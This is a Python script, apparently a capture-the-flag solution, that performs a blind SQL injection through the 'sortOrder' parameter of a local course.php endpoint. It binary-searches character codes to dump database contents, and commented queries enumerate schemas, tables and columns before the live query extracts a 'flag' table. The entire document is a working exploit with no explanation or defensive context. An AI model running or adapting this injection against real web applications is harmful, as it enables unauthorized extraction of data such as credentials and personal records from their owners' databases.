import requests
import time

url = "http://127.0.0.1:52449/course.php"
param = {'sortOrder' : ''}

payload = 'if(ascii(substr(({sql}),{pos},1))>{ascii}, 1, name)'
result = ''

# sql_query = 'select(group_concat(schema_name))from(information_schema.schemata)'
# sql_query = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())'
# sql_query = "select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"
sql_query = 'select(group_concat(flag))from(flag)'

reslen = -1
while len(result) != reslen:
    reslen = len(result)
    low, high = 32, 128
    mid = (low + high)//2
    while low < high:
        param['sortOrder'] = payload.format(sql=sql_query, pos=reslen+1, ascii=mid)
        res = requests.get(url=url, params=param)
        time.sleep(0.04)
    
        if res.json()[0]["id"] == "1":
            low = mid+1
        else:
            high = mid
        mid = (low + high)//2
    if mid != 32 and mid != 128:
        result += chr(mid)
    print(result)
